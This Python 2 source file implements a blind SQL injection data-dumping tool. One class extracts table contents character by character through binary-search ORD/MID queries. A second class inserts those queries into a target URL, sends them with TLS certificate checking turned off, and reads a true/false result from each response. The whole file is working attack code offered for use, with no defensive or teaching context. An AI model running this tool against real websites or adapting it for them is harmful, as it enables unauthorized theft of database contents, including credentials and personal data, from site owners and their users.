#!/usr/bin/python

import urllib,urllib2
import sys
import time, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class BlindBuild:

	def __init__(self, sqlInjector, nbFields, database, table, fieldList, addWhere = '1', pg=False):

		self.sqlInjector = sqlInjector

		self.__select = ','.join(['1']*nbFields)
		self.__db = database
		self.__table = table
		self.__fields = fieldList
		self.__addWhere = addWhere
		self.__progress = pg

		'''
		SELECT __select FROM (SELECT __field FROM __db.__table LIMIT __x, 1) AS res WHERE ORD(MID(res.__field, __n, 1)) = __a
		'''


	'''
	Creates an empty line of result
	'''
	def __createResult(self):
		res = dict()

		for f in self.__fields:
			res[f] = ''

		return res
	'''
	Runs the blind injection
	'''
	def run(self):

		x = 0
		dump = []
		not_end = True

		while not_end:
			
			line = self.__createResult()
			
			for field in self.__fields:
				
				n = 1
				fieldRes = ''

				while True:

					found = 0
					bmin=0
					bmax=256
					hasResult = False

					query = 'SELECT %s FROM (SELECT %s FROM %s.%s WHERE %s LIMIT %d,1) AS res WHERE 1' % (self.__select, field, self.__db, self.__table, self.__addWhere, x)

					if not self.sqlInjector.hasReturnedResult(self.sqlInjector.query(query)):
						not_end = False
						break


					while (bmax-bmin)!=1:
						a = (bmin+bmax)/2
						val = 'ORD(MID(res.%s, %d, 1))' % (field, n)

						query = 'SELECT %s FROM (SELECT %s FROM %s.%s WHERE %s LIMIT %d,1) AS res WHERE %s>=%d AND %s<%d' % (self.__select, field, self.__db, self.__table, self.__addWhere, x, val, bmin, val, a)
				
						res = self.sqlInjector.query(query)
						hasResult = self.sqlInjector.hasReturnedResult(res)

						if hasResult:
							bmax = a
						else:
							bmin = a

					c = bmin

					if c==0:
						break
					else:
						fieldRes += chr(c)
						n += 1

				if not not_end:
					break

				line[field] = fieldRes

			if not_end:
				if self.__progress:
					sys.stdout.write('*')
					sys.stdout.flush()
				dump.append(line)
				x += 1
		
		if self.__progress:
			print ''
		return dump

def simpleCallback(v):

	return v

class SQLInjector:

	def __init__(self, urlStart, queryStart, queryEnd, urlEnd, patternCallback, callback = simpleCallback, cookies = []):

		self.__start = urlStart
		self.__queryStart = queryStart
		self.__queryEnd = queryEnd
		self.__end = urlEnd
		self.__cookies = cookies
		self.__CB = callback
		self.__patternCB = patternCallback
		self.numreq = 0

	def query(self, q, cheat=False):

		url = self.__start + self.__CB(self.__queryStart + q + self.__queryEnd) + self.__end

		self.numreq += 1

		if url[:5].lower()=='https':
			return urllib2.urlopen(url, context=ctx).read()
		else:
			return urllib2.urlopen(url).read()

	def hasReturnedResult(self, res):

		return self.__patternCB(res) 

		return 
